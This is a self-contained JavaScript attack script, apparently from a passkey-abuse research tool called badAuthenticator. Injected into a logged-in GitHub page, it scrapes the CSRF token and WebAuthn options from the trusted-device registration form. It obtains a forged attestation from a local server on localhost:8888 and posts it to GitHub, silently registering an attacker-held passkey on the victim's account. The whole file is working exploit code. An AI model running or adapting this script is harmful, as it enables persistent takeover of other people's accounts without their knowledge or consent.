/* Sends a GitHub trusted-device registration request using badAuthenticator. */

(function () {
    'use strict';

    if (window.shadowPasskeyAttackInProgress) {
        console.warn('[BA] Registration request is already running.');
        return;
    }
    window.shadowPasskeyAttackInProgress = true;

    // This example requires --allow-unauthenticated-attestation on the server.
    const BAD_AUTHENTICATOR_API = 'http://localhost:8888/api/v1/attest';
    const REGISTRATION_PAGE_URL = 'https://github.com/sessions/trusted-device';
    const SUBMISSION_URL = 'https://github.com/u2f/trusted_devices';

    const badAuthenticator = {
        registerAndReplay: async function (options) {
            console.log('[BA] Requesting a credential from badAuthenticator.');
            const preparedOptions = this._cloneAndPrepareOptions(options);
            const serverResponse = await this._fetchShadowCredential(preparedOptions);
            return this._reconstructCredential(serverResponse);
        },
        _cloneAndPrepareOptions: function (options) {
            const pkOptions = options.publicKey;
            const bufferToBase64URL = (buffer) => {
                const bytes = new Uint8Array(buffer);
                return btoa(String.fromCharCode.apply(null, bytes)).replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
            };
            const replacer = (_, value) => {
                if (value instanceof ArrayBuffer) return bufferToBase64URL(value);
                if (ArrayBuffer.isView(value)) {
                    return bufferToBase64URL(value.buffer.slice(value.byteOffset, value.byteOffset + value.byteLength));
                }
                return value;
            };
            return JSON.parse(JSON.stringify(pkOptions, replacer));
        },
        _fetchShadowCredential: async function (preparedOptions) {
            const response = await fetch(BAD_AUTHENTICATOR_API, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ options: preparedOptions }),
            });
            if (!response.ok) {
                const errText = await response.text();
                try { throw new Error(JSON.parse(errText).error); } catch (e) { throw new Error(`badAuthenticator API failed: ${response.status} - ${errText}`); }
            }
            return response.json();
        },
        _reconstructCredential: function (credentialFromServer) {
            const base64URLToArrayBuffer = (base64url) => {
                const base64 = base64url.replace(/-/g, '+').replace(/_/g, '/');
                const binStr = atob(base64);
                const bytes = new Uint8Array(binStr.length);
                for (let i = 0; i < binStr.length; i++) bytes[i] = binStr.charCodeAt(i);
                return bytes.buffer;
            };
            return {
                id: credentialFromServer.id, rawId: base64URLToArrayBuffer(credentialFromServer.rawId), type: credentialFromServer.type,
                response: {
                    clientDataJSON: base64URLToArrayBuffer(credentialFromServer.response.clientDataJSON),
                    attestationObject: base64URLToArrayBuffer(credentialFromServer.response.attestationObject),
                    getTransports: () => credentialFromServer.response.transports || ["internal"],
                },
                getClientExtensionResults: () => credentialFromServer.clientExtensionResults || {},
            };
        }
    };

    async function executeDirectAttack() {
        console.log('[BA] Starting registration request.');

        try {
            console.log(`[BA] Fetching ${REGISTRATION_PAGE_URL}`);
            const pageResponse = await fetch(REGISTRATION_PAGE_URL);
            if (!pageResponse.ok) throw new Error(`Failed to fetch page HTML. Status: ${pageResponse.status}`);
            const htmlText = await pageResponse.text();
            console.log('[BA] Reading the registration form.');
            const parserContainer = document.createElement('div');
            parserContainer.innerHTML = htmlText;

            const formElement = parserContainer.querySelector('.js-add-u2f-registration-form');
            const tokenElement = parserContainer.querySelector('input[name="authenticity_token"]');

            if (!formElement || !tokenElement) throw new Error('Could not find form or authenticity_token in the fetched HTML.');

            const webauthnOptions = JSON.parse(formElement.dataset.webauthnRegisterRequest);
            const authToken = tokenElement.value;
            console.log('[BA] Requesting a credential from badAuthenticator.');
            const credentialToSubmit = await badAuthenticator.registerAndReplay(webauthnOptions);
            console.log(`[BA] Submitting the credential to ${SUBMISSION_URL}`);

            const formData = new FormData();
            formData.append('authenticity_token', authToken);
            // The form expects JSON text in its response field.
            const responseString = JSON.stringify({
                id: credentialToSubmit.id,
                rawId: btoa(String.fromCharCode.apply(null, new Uint8Array(credentialToSubmit.rawId))).replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, ''),
                type: credentialToSubmit.type,
                response: {
                    clientDataJSON: btoa(String.fromCharCode.apply(null, new Uint8Array(credentialToSubmit.response.clientDataJSON))).replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, ''),
                    attestationObject: btoa(String.fromCharCode.apply(null, new Uint8Array(credentialToSubmit.response.attestationObject))).replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, ''),
                    transports: credentialToSubmit.response.getTransports(),
                },
                clientExtensionResults: credentialToSubmit.getClientExtensionResults()
            });
            formData.append('response', responseString);

            const finalResponse = await fetch(SUBMISSION_URL, {
                method: 'POST',
                body: formData,
                headers: {
                    'Accept': 'application/json',
                    'X-Requested-With': 'XMLHttpRequest'
                }
            });

            if (finalResponse.ok) {
                console.log('[BA] Registration POST accepted.', finalResponse);
                alert('Registration POST accepted. Status: ' + finalResponse.status);
            } else {
                console.warn('[BA] Registration POST rejected.', finalResponse);
                const errorText = await finalResponse.text();
                alert(`GitHub rejected the registration POST (HTTP ${finalResponse.status}). See the console for details.`);
                console.warn('[BA] Server response:', errorText);
            }

        } catch (error) {
            console.error('[BA] Registration request failed.', error);
            alert(`Registration request failed: ${error.message}`);
        }
    }

    executeDirectAttack();

})();
